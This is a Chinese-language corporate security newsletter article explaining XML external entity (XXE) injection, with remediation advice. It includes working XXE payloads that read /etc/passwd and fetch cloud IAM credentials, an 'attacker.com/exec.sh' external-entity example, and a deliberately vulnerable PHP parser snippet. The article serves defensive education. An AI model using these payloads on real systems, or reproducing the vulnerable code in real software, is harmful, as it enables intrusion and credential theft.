#  【霄享·安全】XML外部实体注入（XXE）漏洞简介（总第50期月刊）   
原创 刘宇凡  上汽集团网络安全应急响应中心   2025-03-28 18:01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6Hf2gYXNc9VA6we3AZG2Cw5RULoSkXHzXiaPKZCyQYTibkQcU57ib8rBHjoplOQNanwFibDJEAsxYThFlrYlslPHow/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞描述**  
  
XML外部实体注入（XML External Entity Injection，XXE）漏洞是指攻击者通过构造恶意XML数据，利用应用程序未正确配置XML解析器的安全策略，诱导系统执行非授权操作（如文件读取、网络请求、服务端请求伪造等）。  
  
  
1  
  
**漏洞危害**  
  
  
  
**敏感文件读取**  
  
通过定义外部实体并指定file://协议下的文件路径（例如，使用的声明），可利用应用程序的权限非法访问服务器文件，从而导致信息泄露。  
  
  
  
**远程代码执行**  
  
若服务器支持通过URL加载外部实体（如SYSTEM("http://attacker.com/exec.sh")），攻击者可构造恶意脚本并执行，利用服务器权限执行恶意操作，可能导致系统被完全控制或数据被破坏。  
  
  
  
**服务端请求伪造（SSRF）**  
  
利用服务器作为代理，向内部或外部系统发起请求，绕过源IP地址检查机制，实施服务端请求伪造攻击（如探测内网服务、篡改数据）。  
  
  
  
**拒绝服务攻击（DoS）**  
  
通过递归加载大量外部实体或构造超长URL，导致服务器资源耗尽或解析器崩溃。  
  
  
2  
  
**恶意XML示例**  
  
  
  
**读取本地文件**  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>3</storeId>
</stockCheck>
```  
  
**功能**  
：通过file://协议读取本地文件（如/etc/passwd）。  
  
**危害**  
：若XML解析器未禁用外部实体，文件内容将被插入productId元素，可能导致敏感信息泄露。  
  
  
  
**发起HTTP请求**  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://16x.2x4.1x9.2x4/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```  
  
**功能**  
：通过HTTP URL获取外部资源（如云服务实例的IAM凭据）。  
  
**危害**  
：若解析器允许访问该URL，可能导致云服务权限被窃取、内网探测等。  
  
  
3  
  
**PHP中的XXE**  
  
  
simplexml_load_string是PHP中用于解析XML数据的函数，默认允许解析外部实体。以下代码直接从php://input读取输入数据并解析，未禁用外部实体解析或进行输入校验，导致XXE漏洞：  
```
<?php
$xml_input = file_get_contents('php://input');
$data = simplexml_load_string($xml_input);
echo $data->username;
?>
```  
  
  
4  
  
**漏洞案例**  
  
  
某电商平台在处理接收用户上传的XML文件、处理Web服务请求（如SOAP）、解析配置文件等场景时。未禁用外部实体解析，攻击者通过注入file://协议读取服务器上的/etc/passwd文件，获取系统用户信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6Hf2gYXNc9VA6we3AZG2Cw5RULoSkXHzjM9KjesUGYNQa7cFibP7Yvq18aalG3P8bYTAc20yJzCPHsuuvNa3cVg/640?wx_fmt=png&from=appmsg "")  
  
利用XXE漏洞读取文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6Hf2gYXNc9VA6we3AZG2Cw5RULoSkXHzNEa9DRtwujibyfichIebhbbdjDs7HLDtDfW89Wvs1aeicBLiclicD5guQQg/640?wx_fmt=png&from=appmsg "")  
  
利用XXE漏洞进行内网探测：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6Hf2gYXNc9VA6we3AZG2Cw5RULoSkXHz9FUiaSuPCP3wDaMX6CUjxtojOC6UibXYRwYa7z4XaAcm5gd1kiceVJicxQ/640?wx_fmt=png&from=appmsg "")  
  
  
5  
  
**漏洞修复建议**  
  
  
1、禁用外部实体解析，配置XML解析器禁用DTD和外部实体解析，使用安全的XML解析库。  
  
2、对用户输入的XML数据进行严格校验，过滤特殊字符（如声明）  
  
3、确保应用程序以最低权限运行，限制其对文件系统和网络的访问。  
  
4、漏洞扫描及代码审计：定期使用专业工具进行漏洞检测，防患于未然。  
  
5、Web应用防火墙：对网站或APP的业务流量进行恶意特征识别及防护，避免服务器被恶意攻击及入侵。  
  
  
  
  
  
  
  
  
本期专家介绍  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/6Hf2gYXNc9VA6we3AZG2Cw5RULoSkXHzdBWjLHX9onzolYGWsmFNLNTXpjibYwKicJLgRWU2VTa1MFt4MHPIGA5w/640?wx_fmt=jpeg&from=appmsg "")  
  
刘宇凡  
  
  
上海帆一尚行科技有限公司网络安全攻防专家  
  
  
多次参加省市级安全攻防活动，擅长安全防护和渗透测试等网络安全工作  
  
  
部分内容、图片源自网络，如有侵权请与我们联系删除。  
  
  
  
点击下方名片，关注我们 ⬇️  
  
  
  
